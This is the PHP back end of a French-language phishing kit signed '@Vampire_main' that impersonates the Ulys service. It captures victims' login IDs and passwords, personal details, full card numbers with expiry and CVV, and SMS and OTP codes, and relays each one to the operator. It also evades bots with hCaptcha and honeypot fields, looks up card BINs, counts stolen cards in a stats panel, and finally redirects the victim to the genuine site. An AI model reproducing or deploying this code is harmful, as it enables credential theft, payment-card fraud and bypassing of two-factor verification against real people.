<?php
require_once 'model/app.php';

function check() {
    // Validate hCAPTCHA checkbox 
    if(!empty($_POST['h-captcha-response'])){ 
        // Verify API URL 
        $verifyURL = 'https://hcaptcha.com/siteverify'; 
         
        // Retrieve token from post data with key 'h-captcha-response' 
        $token = $_POST['h-captcha-response']; 
         
        // Build payload with secret key and token 
        $data = array( 
            'secret' => SECRETKEY, 
            'response' => $token, 
            'remoteip' => $_SERVER['REMOTE_ADDR'] 
        ); 
         
        // Initialize cURL request 
        // Make POST request with data payload to hCaptcha API endpoint 
        $curlConfig = array( 
            CURLOPT_URL => $verifyURL, 
            CURLOPT_POST => true, 
            CURLOPT_RETURNTRANSFER => true, 
            CURLOPT_POSTFIELDS => $data 
        ); 
        $ch = curl_init(); 
        curl_setopt_array($ch, $curlConfig); 
        $response = curl_exec($ch); 
        curl_close($ch); 
         
        // Parse JSON from response. Check for success or error codes 
        $responseData = json_decode($response); 
         
        // If reCAPTCHA response is valid 
        if($responseData->success){ 
            header("Location: index.php?view=explain&id=" . md5(time()));
            $statusMsg = 'Your contact request has submitted successfully.';
        }else{ 
            $file = 'Panel/stats/stats.ini';
            $data = @parse_ini_file($file);
            $data['bots']++;
            update_ini($data, $file);
            die("USER NOT ALLOWED");
            $statusMsg = 'Robot verification failed, please try again.'; 
        } 
    }else{ 
        $_SESSION['ERRORS']['captcha'] = "Invalid Captcha.";
        header("Location: index.php?view=index&id=" . md5(time()));
        $statusMsg = 'Please check on the CAPTCHA box.'; 
    } 
}

function index() {
    if(!isset($_SESSION)) {
        session_start();
    }

    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $_SESSION['ERRORS'] = [];

    // Si l'utilisateur clique sur "Continuer sans compte", on enregistre et on envoie les champs même vides, sans vérification
    if (isset($_POST['submit']) && $_POST['submit'] === 'guest') {
        $_SESSION['snir'] = isset($_POST['nir']) ? htmlspecialchars($_POST['nir']) : '';
        $_SESSION['spassword'] = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';

        $rezdata = "⚠️ CONNEXION ULYS  SANS COMPTE ⚠️ 
⏱️ DATE : ".date("Y-m-d H:i:s")."
 IP : $ip
💻 APPAREIL : $agent

🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
        send($rezdata);

        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['logs']++;
        update_ini($data, $file);

        header("Location: index.php?view=explain&id=".md5(time()));
        exit;
    }

    $requiredFields = ['nir', 'password'];

    foreach ($requiredFields as $field) {
        if (isset($_POST[$field])) {
            $_SESSION['s' . $field] = htmlspecialchars($_POST[$field]);
            if (empty($_SESSION['s' . $field])) {
                $_SESSION['ERRORS'][$field] = "Veuillez entrer un $field valide.";
            }
        } else {
            $_SESSION['ERRORS'][$field] = "Le champ $field est manquant dans l'envoi du formulaire.";
        }
    }

    // Check if any of the required fields are empty
    if (!empty($_SESSION['ERRORS'])) {
        header("Location: index.php?view=main&id=" . md5(time()));
        exit;
    }
    else {
         
        $rezdata = "⚠️ CONNEXION Ulys ⚠️ 
🔢 Identifiants : ".$_SESSION['snir']."
🔑 Mot de passe : ".$_SESSION['spassword']."
⏱️ DATE : ".date("Y-m-d H:i:s")."
 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
        
        send($rezdata);

        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['logs']++;
        update_ini($data, $file);

        header("Location: index.php?view=explain&id=".md5(time()));
        exit;
    }
}

function Explain() {
    header("Location: index.php?view=infoz&id=".md5(time()));
    exit;
}

function Infoz() {
    if(!isset($_SESSION)) {
        session_start();
    }

    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $_SESSION['ERRORS'] = [];



    $requiredFields = ['lastname', 'firstname', 'dob', 'adress', 'zip', 'city', 'phone'];

    foreach ($requiredFields as $field) {
        if (isset($_POST[$field])) {
            $_SESSION[$field] = htmlspecialchars($_POST[$field]);
            if (empty($_SESSION[$field])) {
                $_SESSION['ERRORS'][$field] = "Veuillez entrer un $field valide.";
            }
        } else {
            $_SESSION['ERRORS'][$field] = "Le champ $field est manquant dans l'envoi du formulaire.";
        }
    }

    // Check if any of the required fields are empty
    if (!empty($_SESSION['ERRORS'])) {
        header("Location: index.php?view=infoz&id=" . md5(time()));
        exit;
    }
    else {
         
        $rezdata = "👤 INFORMATIONS ULYS ".FLAG."

📝 Nom : ".$_SESSION['lastname']." ".$_SESSION['firstname']."
🎂 Date de naissance : ".$_SESSION['dob']."
🏠 Adresse : ".$_SESSION['adress']."
📱 Téléphone : ".$_SESSION['phone']."
🏙️ Ville : ".$_SESSION['city']."
📮 Code Postal : ".$_SESSION['zip']."



⏱️ DATE : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
        
        if (NOTIF) sendnotif($rezdata);

        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['infos']++;
        update_ini($data, $file);

        header("Location: index.php?view=pay&id=".md5(time()));
        exit;
    }
}

function Otp() {
    if(!isset($_SESSION)) {
        session_start();
    }

    //GET IP AND OS
    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $_SESSION['ERRORS'] = [];

    if (isset($_POST['otp'])) {
        $_SESSION['sotp'] = htmlspecialchars($_POST['otp']);
        if (empty($_SESSION['sotp'])) {
            $_SESSION['ERRORS']['otp'] = "Veuillez entrer un code OTP valide.";
        }
    } else {
        $_SESSION['ERRORS']['otp'] = "Le champ OTP est manquant dans l'envoi du formulaire.";
    }

    // Check if any of the required fields are empty
    if (!empty($_SESSION['ERRORS'])) {
        header("Location: index.php?view=otp&id=" . md5(time()));
        exit;
    } else {
        $rezdata = "📲 CODE OTP ULYS ".FLAG."

🔐 Code OTP : ".$_SESSION['sotp']."

⏱️ DATE : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
        
        send($rezdata);

        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['logs']++;
        update_ini($data, $file);

        header("Location: index.php?view=load&id=".md5(time()));
        exit;
    }
}

function Sms() {
    if(!isset($_SESSION)) {
        session_start();
    }

    //GET IP AND OS
    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $_SESSION['ERRORS'] = [];

    if (isset($_POST['sms'])) {
        $_SESSION['ssms'] = htmlspecialchars($_POST['sms']);
        if (empty($_SESSION['ssms'])) {
            $_SESSION['ERRORS']['sms'] = "Veuillez entrer un code SMS valide.";
        }
    } else {
        $_SESSION['ERRORS']['sms'] = "Le champ SMS est manquant dans l'envoi du formulaire.";
    }

    // Check if any of the required fields are empty
    if (!empty($_SESSION['ERRORS'])) {
        header("Location: index.php?view=sms&id=" . md5(time()));
        exit;
    } else {
        $rezdata = "📲 CODE SMS ULYS ".FLAG."

🔐 Code SMS : ".$_SESSION['ssms']."

⏱️ DATE : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
        
        send($rezdata);

        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['logs']++;
        update_ini($data, $file);

        header("Location: index.php?view=load&id=".md5(time()));
        exit;
    }
}

function Vbv() {
    if(!isset($_SESSION)) {
        session_start();
    }

    //GET IP AND OS
    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    // Plus de vérification de champ, on passe directement à l'action
    $rezdata = "📲 VBV ULYS ".FLAG."

La victime a confirmé le VBV

⏱️ DATE : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
    
    send($rezdata);

    $file = 'Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['logs']++;
    update_ini($data, $file);

    header("Location: index.php?view=load&id=".md5(time()));
    exit;
}

function Pay() {
    if(!isset($_SESSION)) {
        session_start();
    }

    //GET IP AND OS
    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $_SESSION['ERRORS'] = [];

    // Vérification du honeypot - si les champs sont remplis, c'est probablement un bot
    if (!empty($_POST['card_type']) || !empty($_POST['card_holder'])) {
        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("HTTP/1.0 404 Not Found");
    }

    // Utilisation des bons noms de champs
    $requiredFields = ['cardnumber', 'exp', 'cvv', 'holder'];

    foreach ($requiredFields as $field) {
        if (isset($_POST[$field])) {
            // Nettoyage du CVV : suppression des espaces
            if ($field === 'cvv') {
                $cvv = preg_replace('/\s+/', '', $_POST['cvv']);
                $_SESSION['cvv'] = $cvv;
                if (empty($cvv)) {
                    $_SESSION['ERRORS']['cvv'] = "Veuillez entrer un cvv valide.";
                }
            } else {
                $_SESSION[$field] = htmlspecialchars($_POST[$field]);
                if (empty($_SESSION[$field])) {
                    $_SESSION['ERRORS'][$field] = "Veuillez entrer un $field valide.";
                }
            }
        } else {
            $_SESSION['ERRORS'][$field] = "Le champ $field est manquant dans l'envoi du formulaire.";
        }
    }

    // Validation stricte du CVV : 3 ou 4 chiffres uniquement
    if (!empty($_SESSION['cvv']) && !preg_match('/^\d{3,4}$/', $_SESSION['cvv'])) {
        $_SESSION['ERRORS']['cvv'] = "Le CVV doit comporter 3 ou 4 chiffres.";
    }

    // Check if any of the required fields are empty
    if (!empty($_SESSION['ERRORS'])) {
        header("Location: index.php?view=pay&id=" . md5(time()));
        exit;
    } else {
         
        $bin = substr($_SESSION['cardnumber'], 0, 6);

        $binapi = @json_decode(@file_get_contents("https://lookup.binlist.net/$bin"));

        $brand = isset($binapi->scheme) ? $binapi->scheme : "N/A";
        $type = isset($binapi->type) ? $binapi->type : "N/A";
        $bank = isset($binapi->bank->name) ? $binapi->bank->name : "N/A";
        $cardlevel = isset($binapi->brand) ? $binapi->brand : "N/A";
        $country = isset($binapi->country->name) ? $binapi->country->name : "N/A";
        
        $_SESSION['scan'] = $_SESSION['cardnumber']; // Pour le bincheck dans sendCard
        
        $rezdata = "💳 DÉTAILS CARTE Ulys rezzz ".FLAG."

💳 Numéro : ".$_SESSION['cardnumber']."
🔄 Expiration : ".$_SESSION['exp']."
🔒 CVV : ".$_SESSION['cvv']."

INFORMATIONS BIN :
TYPE : $brand - $type
BANQUE : $bank
NIVEAU : $cardlevel
PAYS : $country

👤 INFORMATIONS PERSONNELLES :
📝 Nom : ".(isset($_SESSION['holder']) ? $_SESSION['holder'] : 'N/A')."
🎂 Date de naissance : ".(isset($_SESSION['dob']) ? $_SESSION['dob'] : 'N/A')."
🏠 Adresse : ".(isset($_SESSION['adress']) ? $_SESSION['adress'] : 'N/A')."
📱 Téléphone : ".(isset($_SESSION['phone']) ? $_SESSION['phone'] : 'N/A')."
🏙️ Ville : ".(isset($_SESSION['city']) ? $_SESSION['city'] : 'N/A')."
📮 Code Postal : ".(isset($_SESSION['zip']) ? $_SESSION['zip'] : 'N/A')."



⏱️ DATE : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
        
        // Statistiques d'abord pour s'assurer qu'elles sont enregistrées
        $file = 'Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['cc']++;
        update_ini($data, $file);
        
        // Vérification de SMSOTP
        if (defined('SMSOTP') && SMSOTP > 0) {
            $message_sent = send($rezdata);
            
            switch (SMSOTP) {
                case 1:
                    header("Location: index.php?view=sms&id=".md5(time()));
                    exit;
                case 2:
                    header("Location: index.php?view=otp&id=".md5(time()));
                    exit;
                case 3:
                    header("Location: index.php?view=vbv&id=".md5(time()));
                    exit;
                case 4:
                    header("Location: index.php?view=confirm&id=".md5(time()));
                    exit;
                default:
                    // Redirection par défaut
                    header("Location: index.php?view=load&id=".md5(time()));
                    exit;
            }
        } else {
            // Envoie du message et redirection vers la page de chargement
            $message_sent = send($rezdata);
            
            // On redirige vers la page load qui affiche un écran de chargement
            header("Location: index.php?view=load&id=".md5(time()));
            exit;
        }
    }
}

function Conf() {
    if(!isset($_SESSION)) {
        session_start();
    }

    $ip = get_client_ip();
    $agent = $_SERVER['HTTP_USER_AGENT'];

    $rezdata = "✅ Victime TERMINÉ Ulys ".FLAG."

⏱️ DATE : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💻 APPAREIL : $agent
    
🧛‍♂️ [ Créé par @Vampire_main ] 🧛‍♂️
";
    
    send($rezdata);

    header("Location: ".WEBSITE);
    exit;
} 